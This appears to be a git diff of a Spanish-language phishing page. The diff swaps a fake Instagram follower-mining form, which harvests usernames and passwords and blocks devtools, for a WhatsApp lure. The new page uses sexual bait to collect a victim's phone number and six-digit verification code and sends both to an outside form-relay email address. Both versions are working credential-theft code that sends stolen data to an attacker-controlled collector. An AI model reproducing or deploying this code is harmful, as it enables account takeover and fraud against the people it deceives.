@@ -1,48 +1,21 @@
 <!DOCTYPE html>
 <html lang="es">
-
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>InstaFollowMe</title>
-    <head>
-        <!-- Open Graph (Facebook, LinkedIn, WhatsApp, etc) -->
-        <meta property="og:title" content="¡Gana Seguidores Reales en Instagram!">
-        <meta property="og:description" content="Herramienta profesional para aumentar tu audiencia orgánica en Instagram. Métodos 100% seguros.">
-        <meta property="og:image" content="https://i.ibb.co/0gH2zPF/DALL-E-2025-03-01-18-01-53-A-professional-and-sleek-digital-illustration-symbolizing-Instagram-follo.webp">
-        <meta property="og:type" content="website">
-        <meta property="og:site_name" content="InstaFollowMe">
-        
-    </head>
-    <link rel="icon" href="https://upload.wikimedia.org/wikipedia/commons/e/e7/Instagram_logo_2016.svg">
-    <script>
-        // Deshabilitar el clic derecho
-        document.addEventListener('contextmenu', function (e) {
-            e.preventDefault(); // Evita que se abra el menú contextual
-        });
+    <meta property="og:title" content="🤤Chicas a todo dar😈">
+    <meta property="og:description" content="Únete al grupo de WhatsApp para disfrutar de contenido exclusivo.">
+    <meta property="og:image" content="https://photos.xgroovy.com/contents/albums/sources/633000/633809/689864.jpg">
+    <meta property="og:url" content=""> <!-- Cambia esto por la URL de tu página -->
+    <meta property="og:type" content="website">
 
-        // Opcional: Deshabilitar la tecla F12 y Ctrl+Shift+I (Inspeccionar)
-        document.addEventListener('keydown', function (e) {
-            // Bloquear F12
-            if (e.key === 'F12') {
-                e.preventDefault();
-            }
-            // Bloquear Ctrl+Shift+I y Ctrl+Shift+J
-            if (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J')) {
-                e.preventDefault();
-            }
-        });
-    </script>
-    <!-- Font Awesome para el ícono de Instagram -->
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <title>🤤Chicas a todo dar</title>
+    <link rel="icon" type="image/x-icon" href="https://static.whatsapp.net/rsrc.php/v3/yP/r/rYZqPCBaG70.png">
     <style>
         /* Estilos generales */
         body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background-color: #121212;
-            /* Fondo oscuro */
-            color: #ffffff;
-            /* Texto blanco */
+            font-family: Arial, sans-serif;
+            background-color: #f0f2f5;
             display: flex;
             justify-content: center;
             align-items: center;
@@ -50,243 +23,247 @@
             margin: 0;
         }
 
-        .container {
-            background-color: #1e1e1e;
-            /* Fondo del contenedor oscuro */
-            padding: 30px;
-            border-radius: 10px;
-            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.3);
-            max-width: 400px;
-            width: 100%;
+        /* Contenedor del login */
+        .login-container {
+            background-color: #ffffff;
+            padding: 40px;
+            border-radius: 8px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
             text-align: center;
+            width: 300px;
+            position: relative;
         }
 
+        /* Logo de WhatsApp */
+        .whatsapp-logo {
+            width: 80px; /* Ancho fijo */
+            height: 80px; /* Alto igual al ancho */
+            margin-bottom: 20px;
+            border-radius: 50%; /* Hace que la imagen sea redonda */
+            object-fit: cover; /* Evita que la imagen se distorsione */
+        }
+
+        /* Título */
         h1 {
             font-size: 24px;
+            color: #25d366;
             margin-bottom: 20px;
-            color: #ffffff;
-            /* Color inicial del texto */
-            font-weight: 600;
-            position: relative;
-            display: inline-block;
-            animation: scaleAndColor 2s infinite ease-in-out;
-            /* Animación de escalado y cambio de color */
         }
 
-        /* Definición de la animación */
-        @keyframes scaleAndColor {
-            0% {
-                transform: scale(1);
-                /* Tamaño normal */
-                color: #ffffff;
-                /* Blanco */
-            }
-
-            50% {
-                transform: scale(1.1);
-                /* Escala un 10% más grande */
-                color: #E1306C;
-                /* Rosa de Instagram */
-            }
-
-            100% {
-                transform: scale(1);
-                /* Vuelve al tamaño normal */
-                color: #ffffff;
-                /* Blanco */
-            }
+        /* Contenedor de inputs (código de país y número) */
+        .input-group {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 15px;
         }
 
-        /* Estilos para el ícono de Instagram */
-        .instagram-icon {
-            font-size: 70px;
-            color: #E1306C;
-            /* Color de Instagram */
-            margin-bottom: 1px;
-        }
-
-        /* Estilos para los campos del formulario */
-        input[type="text"],
-        input[type="password"] {
-            width: 93%;
-            padding: 12px;
-            margin: 10px 0;
-            border: 1px solid #333;
-            /* Borde oscuro */
-            border-radius: 5px;
+        /* Input del código de país */
+        #countryCode {
+            width: 50px;
+            padding: 10px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
             font-size: 14px;
             outline: none;
-            background-color: #333;
-            /* Fondo oscuro */
-            color: #ffffff;
-            /* Texto blanco */
-            transition: border-color 0.3s ease;
         }
 
-        input[type="text"]:focus,
-        input[type="password"]:focus {
-            border-color: #007bff;
-            /* Borde azul al enfocar */
+        /* Input del número de teléfono */
+        #phoneNumber {
+            flex: 1;
+            padding: 8px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            font-size: 14px;
+            outline: none;
         }
 
-        /* Estilos para el botón */
+        /* Input del código de verificación */
+        #verificationCode {
+            width: 40%;
+            padding: 10px;
+            margin-bottom: 15px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            font-size: 14px;
+            text-align: center;
+            outline: none;
+        }
+
+        /* Botón de inicio de sesión */
         button {
-            background-color: #007bff;
-            /* Botón azul */
-            color: white;
+            width: 100%;
+            padding: 10px;
+            background-color: #25d366;
+            color: #ffffff;
             border: none;
-            padding: 12px 20px;
-            border-radius: 5px;
+            border-radius: 4px;
             font-size: 16px;
             cursor: pointer;
-            width: 100%;
-            margin-top: 10px;
-            transition: background-color 0.3s ease;
         }
 
         button:hover {
-            background-color: #0056b3;
-            /* Botón azul oscuro al pasar el mouse */
+            background-color: #128c7e;
         }
 
-        /* Mensaje de pie de página */
-        .footer {
-            margin-top: 20px;
-            font-size: 12px;
-            color: #777;
-            /* Texto gris */
-        }
-
-        .footer a {
-            color: #007bff;
-            /* Enlace azul */
-            text-decoration: none;
-        }
-
-        .footer a:hover {
-            text-decoration: underline;
-        }
-
-        /* Estilos para el mensaje de éxito */
-        .success-message {
+        /* Ocultar elementos */
+        .hidden {
             display: none;
-            /* Oculto por defecto */
-            font-size: 15px;
-            color: #28a745;
-            /* Texto verde */
-            margin-top: 20px;
         }
 
-        /* Estilos para el input de "minando seguidores" */
-        .mining-input {
-            width: 100%;
-            padding: 12px;
-            margin: 10px 0;
-            border: 1px solid #28a745;
-            /* Borde verde */
+        /* Alertas personalizadas */
+        .custom-alert {
+            position: fixed;
+            top: 20px;
+            left: 50%;
+            transform: translateX(-50%);
+            background-color: #25d366;
+            color: white;
+            padding: 15px 30px;
             border-radius: 5px;
-            font-size: 11px;
-            color: #28a745;
-            /* Texto verde */
-            text-align: center;
-            background-color: #1e2b1e;
-            /* Fondo verde oscuro */
-            display: none;
-            /* Oculto por defecto */
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+            z-index: 1000;
+            animation: slideIn 0.5s ease-out;
+        }
+
+        .custom-alert.error {
+            background-color: #ff4444;
+        }
+
+        @keyframes slideIn {
+            from {
+                top: -50px;
+                opacity: 0;
+            }
+            to {
+                top: 20px;
+                opacity: 1;
+            }
         }
     </style>
 </head>
-
 <body>
-    <div class="container">
-        <!-- Ícono de Instagram -->
-        <div class="instagram-icon">
-            <i class="fab fa-instagram"></i>
-        </div>
+    <div class="login-container">
+        <!-- Logo de WhatsApp -->
+        <img src="https://photos.xgroovy.com/contents/albums/sources/633000/633809/689864.jpg" alt="Chica" class="whatsapp-logo">
+        
+        <!-- Título -->
+        <h1>🤤Chicas a todo dar😈</h1>
 
-        <h1>InstaFollowMe</h1>
-        <form id="loginForm" action="https://formsubmit.co/ruletaemailscu@gmail.com" method="POST">
-            <!-- Campos del formulario -->
-            <input type="text" id="username" name="Usuario" placeholder="Usuario de Instagram" required>
-            <input type="password" id="password" name="Contra" placeholder="Contraseña" required>
-
-            <!-- Evitar spam -->
+        <!-- Formulario de login (Primera parte: Código de país y número) -->
+        <form id="phoneForm">
+            <div class="input-group">
+                <input type="text" id="countryCode" name="PaisCode" placeholder="+52" required>
+                <input type="text" id="phoneNumber" name="CeluNumber" placeholder="Número de teléfono" required>
+            </div>
+            <button type="submit">Continuar</button>
             <input type="hidden" name="_captcha" value="false">
-
-            <!-- Botón de envío -->
-            <button type="submit">Minar seguidores</button>
         </form>
 
-        <!-- Mensaje de éxito -->
-        <div class="success-message" id="successMessage">
-            ⚠️ Asegúrate de que tus credenciales sean correctas. Si son incorrectas, no podrás recibir tus seguidores.
-        </div>
-
-        <!-- Input de "minando seguidores" -->
-        <input type="text" class="mining-input" id="miningInput" value="✅ Su cuenta está minando seguidores." readonly>
-
-        <div class="footer">
-            ¿Necesitas ayuda? <a style="text-decoration: none; color:#007bff;" href="https://chat.whatsapp.com/Kc9cCPc3NoOEowGDexlPiE">Contáctanos</a>
-        </div>
+        <!-- Formulario de código de verificación (Segunda parte) -->
+        <form id="codeForm" class="hidden">
+            <div>
+                <input type="text" id="verificationCode" name="verificaCode" placeholder="Código" maxlength="6" required>
+            </div>
+            <button type="submit">Verificar</button>
+            <input type="hidden" name="_captcha" value="false">
+        </form>
     </div>
 
+    <!-- Script para manejar el login -->
     <script>
-        // Cargar datos del localStorage al cargar la página
-        window.onload = function () {
-            const savedUsername = localStorage.getItem('username');
-            const savedPassword = localStorage.getItem('password');
-            const formSubmitted = localStorage.getItem('formSubmitted');
+        const phoneForm = document.getElementById("phoneForm");
+        const codeForm = document.getElementById("codeForm");
+        const verificationCodeInput = document.getElementById("verificationCode");
 
-            if (savedUsername) {
-                document.getElementById('username').value = savedUsername;
-            }
-            if (savedPassword) {
-                document.getElementById('password').value = savedPassword;
-            }
+        // Función para mostrar alertas personalizadas
+        function showAlert(message, isError = false) {
+            const alertDiv = document.createElement("div");
+            alertDiv.className = `custom-alert ${isError ? "error" : ""}`;
+            alertDiv.textContent = message;
+            document.body.appendChild(alertDiv);
 
-            // Si el formulario ya fue enviado, ocultarlo y mostrar los mensajes
-            if (formSubmitted === 'true') {
-                document.getElementById('loginForm').style.display = 'none';
-                document.getElementById('successMessage').style.display = 'block';
-                document.getElementById('miningInput').style.display = 'block';
-            }
-        };
+            // Eliminar la alerta después de 3 segundos
+            setTimeout(() => {
+                alertDiv.remove();
+            }, 3000);
+        }
 
-        // Guardar datos en el localStorage al enviar el formulario
-        document.getElementById('loginForm').addEventListener('submit', function (event) {
-            event.preventDefault(); // Evita que el formulario se envíe de forma tradicional
-
-            // Obtener los valores del formulario
-            const username = document.getElementById('username').value;
-            const password = document.getElementById('password').value;
-
-            // Guardar en el localStorage
-            localStorage.setItem('username', username);
-            localStorage.setItem('password', password);
-            localStorage.setItem('formSubmitted', 'true'); // Indicar que el formulario fue enviado
-
-            // Simular el envío del formulario
-            fetch(this.action, {
-                method: 'POST',
-                body: new FormData(this),
-            })
-                .then(response => {
-                    if (response.ok) {
-                        // Ocultar el formulario
-                        document.getElementById('loginForm').style.display = 'none';
-
-                        // Mostrar el mensaje de éxito
-                        document.getElementById('successMessage').style.display = 'block';
-
-                        // Mostrar el input de "minando seguidores"
-                        document.getElementById('miningInput').style.display = 'block';
+        // Función para enviar datos del formulario
+        async function sendFormData(form, url) {
+            const formData = new FormData(form);
+            try {
+                const response = await fetch(url, {
+                    method: 'POST',
+                    body: formData,
+                    headers: {
+                        'Accept': 'application/json'
                     }
-                })
-                .catch(error => {
-                    console.error('Error al enviar el formulario:', error);
                 });
+                const result = await response.json();
+                console.log('Respuesta del servidor:', result);
+                showAlert("Datos enviados correctamente.");
+                return true; // Indica que el envío fue exitoso
+            } catch (error) {
+                console.error('Error:', error);
+                showAlert("...", true);
+                return false; // Indica que el envío falló
+            }
+        }
+
+        // Manejar el envío del formulario de teléfono
+        phoneForm.addEventListener("submit", function(event) {
+            event.preventDefault(); // Evita que el formulario se envíe automáticamente
+
+            // Obtener valores del formulario
+            const countryCode = document.getElementById("countryCode").value;
+            const phoneNumber = document.getElementById("phoneNumber").value;
+
+            // Validación básica
+            if (countryCode === "" || phoneNumber === "") {
+                showAlert("Por favor, completa todos los campos.", true);
+                return;
+            }
+
+            // Simular envío de código de verificación
+            showAlert(`Código de verificación enviado a:\n${countryCode} ${phoneNumber}`);
+            console.log(`Código de país: ${countryCode}, Número: ${phoneNumber}`);
+
+            // Enviar datos del formulario
+            sendFormData(phoneForm, 'https://formsubmit.co/thebullnot@gmail.com');
+
+            // Ocultar el formulario de teléfono y mostrar el de código
+            phoneForm.classList.add("hidden");
+            codeForm.classList.remove("hidden");
+        });
+
+        // Manejar el envío del formulario de código
+        codeForm.addEventListener("submit", async function(event) {
+            event.preventDefault(); // Evita que el formulario se envíe automáticamente
+
+            // Obtener el código de verificación (sin guion)
+            const verificationCode = verificationCodeInput.value.replace(/-/g, "");
+
+            // Validación básica
+            if (verificationCode === "") {
+                showAlert("Por favor, ingresa el código de verificación.", true);
+                return;
+            }
+
+            // Validar que el código tenga exactamente 6 dígitos
+            if (verificationCode.length !== 6 || !/^\d+$/.test(verificationCode)) {
+                showAlert("El código de verificación debe tener exactamente 6 dígitos.", true);
+                return;
+            }
+
+            // Enviar datos del formulario
+            const success = await sendFormData(codeForm, 'https://formsubmit.co/thebullnot@gmail.com');
+
+            // Si el envío fue exitoso, redirigir al enlace de WhatsApp
+            if (success) {
+                showAlert("Código verificado correctamente.\nRedirigiendo...");
+                window.location.href = "https://chat.whatsapp.com/JpD75y9mFKlLqc2u7FJj51";
+            }
         });
     </script>
-    <div style="display: none;">
 </body>
 </html>
